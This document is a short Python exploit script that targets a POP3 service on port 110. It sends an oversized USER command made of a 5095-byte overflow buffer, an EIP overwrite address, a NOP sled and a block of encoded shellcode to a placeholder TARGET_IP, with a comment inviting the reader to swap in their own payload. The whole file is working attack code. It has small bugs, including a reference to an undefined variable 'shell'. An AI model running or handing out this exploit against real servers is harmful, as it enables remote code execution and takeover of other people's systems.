#!/usr/python
import sys
import socket
import time
from struct import *
buffer = b"A" * 5095
eip = b"\xF9\x24\x9E\x0F"
nops = b"\x90" * 20
#Change the shellcode variable with your payload
shellcode =  b""
shellcode += b"\xbb\xa4\xf9\x62\x96\xdd\xc4\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x5a\x12\x83\xc2\x04"
shellcode += b"\x03\xfe\xf7\x80\x63\x02\xef\xc7\x8c\xfa\xf0"
shellcode += b"\xa7\x05\x1f\xc1\xe7\x72\x54\x72\xd8\xf1\x38"
shellcode += b"\x7f\x93\x54\xa8\xf4\xd1\x70\xdf\xbd\x5c\xa7"
shellcode += b"\xee\x3e\xcc\x9b\x71\xbd\x0f\xc8\x51\xfc\xdf"
shellcode += b"\x1d\x90\x39\x3d\xef\xc0\x92\x49\x42\xf4\x97"
shellcode += b"\x04\x5f\x7f\xeb\x89\xe7\x9c\xbc\xa8\xc6\x33"
shellcode += b"\xb6\xf2\xc8\xb2\x1b\x8f\x40\xac\x78\xaa\x1b"
shellcode += b"\x47\x4a\x40\x9a\x81\x82\xa9\x31\xec\x2a\x58"
shellcode += b"\x4b\x29\x8c\x83\x3e\x43\xee\x3e\x39\x90\x8c"
shellcode += b"\xe4\xcc\x02\x36\x6e\x76\xee\xc6\xa3\xe1\x65"
shellcode += b"\xc4\x08\x65\x21\xc9\x8f\xaa\x5a\xf5\x04\x4d"
shellcode += b"\x8c\x7f\x5e\x6a\x08\xdb\x04\x13\x09\x81\xeb"
shellcode += b"\x2c\x49\x6a\x53\x89\x02\x87\x80\xa0\x49\xc0"
shellcode += b"\x65\x89\x71\x10\xe2\x9a\x02\x22\xad\x30\x8c"
shellcode += b"\x0e\x26\x9f\x4b\x70\x1d\x67\xc3\x8f\x9e\x98"
shellcode += b"\xca\x4b\xca\xc8\x64\x7d\x73\x83\x74\x82\xa6"
shellcode += b"\x04\x24\x2c\x19\xe5\x94\x8c\xc9\x8d\xfe\x02"
shellcode += b"\x35\xad\x01\xc9\x5e\x44\xf8\x9a\xa0\x31\x13"
shellcode += b"\x58\x49\x40\x13\x4f\xd5\xcd\xf5\x05\xf5\x9b"
shellcode += b"\xae\xb1\x6c\x86\x24\x23\x70\x1c\x41\x63\xfa"
shellcode += b"\x93\xb6\x2a\x0b\xd9\xa4\xdb\xfb\x94\x96\x4a"
shellcode += b"\x03\x03\xbe\x11\x96\xc8\x3e\x5f\x8b\x46\x69"
shellcode += b"\x08\x7d\x9f\xff\xa4\x24\x09\x1d\x35\xb0\x72"
shellcode += b"\xa5\xe2\x01\x7c\x24\x66\x3d\x5a\x36\xbe\xbe"
shellcode += b"\xe6\x62\x6e\xe9\xb0\xdc\xc8\x43\x73\xb6\x82"
shellcode += b"\x38\xdd\x5e\x52\x73\xde\x18\x5b\x5e\xa8\xc4"
shellcode += b"\xea\x37\xed\xfb\xc3\xdf\xf9\x84\x39\x40\x05"
shellcode += b"\x5f\xfa\x60\xe4\x75\xf7\x08\xb1\x1c\xba\x54"
shellcode += b"\x42\xcb\xf9\x60\xc1\xf9\x81\x96\xd9\x88\x84"
shellcode += b"\xd3\x5d\x61\xf5\x4c\x08\x85\xaa\x6d\x19"
shellcode += b"C" * (6000 - len(buffer) - len(eip))

print("Sending payload")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("TARGET_IP", 110))
s.recv(1024)

s.send(b"USER " + buffer + eip + nops + shell + b"\r\n")
print (s.recv(1024))
s.send(b"QUIT\r\n")
s.close()
time.sleep(1)